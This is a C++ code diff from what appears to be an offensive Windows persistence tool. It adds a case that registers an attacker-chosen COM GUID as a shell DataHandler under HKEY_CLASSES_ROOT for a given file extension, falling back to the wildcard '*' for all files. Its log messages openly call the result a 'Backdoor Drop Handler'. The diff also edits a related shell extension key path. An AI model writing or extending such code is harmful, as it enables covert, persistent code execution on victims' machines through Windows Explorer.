@@ -378,7 +378,7 @@ namespace reg {
 
 				strExt = std::wstring(ext);
 				progId = ResolveProgId(strExt.c_str());
-				progId.append(L"\\shellex\\{E357FCCD-A995-4576-B01F-234630154E96}\\BackdoorHandler");
+				progId.append(L"\\shellex\\{E357FCCD-A995-4576-B01F-234630154E96}\\");
 				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
 				if (hkResult) {
 
@@ -488,7 +488,56 @@ namespace reg {
 					}
 					break;
 				}
+				break;
 
+		case DATA_HANDLER:
+			if (ext) {
+
+				strExt = std::wstring(ext);
+				progId = ResolveProgId(strExt.c_str());
+				progId.append(L"\\shellex\\DataHandler");
+				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
+				if (hkResult) {
+
+					status = AddDefaultValue(hkResult, Guid);
+					if (status == ERROR_SUCCESS) {
+
+						logging::log(LVL_INFO, L"Successfully Created Backdoor Drop Handler");
+						break;
+					}
+					else {
+
+						logging::log(LVL_FATAL, L"Unable to Set Backdoor Drop Handler");
+
+					}
+					break;
+				}
+				break;
+
+			}
+			else {
+
+				logging::log(LVL_WARNING, L"No Extension Was Provided For Drop Handler, Using Wildcard (*) Drop Handler");
+				progId = std::wstring(L"*\\shellex\\DataHandler");
+				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
+				if (hkResult) {
+
+					status = AddDefaultValue(hkResult, Guid);
+					if (status == ERROR_SUCCESS) {
+
+						logging::log(LVL_INFO, L"Successfully Created Backdoor Drop Handler");
+						break;
+					}
+					else {
+
+						logging::log(LVL_FATAL, L"Unable to Set Backdoor Drop Handler");
+
+					}
+					break;
+				}
+				break;
+			}
+			break;
 			return (status == ERROR_SUCCESS) ? TRUE : FALSE;
 
 			}
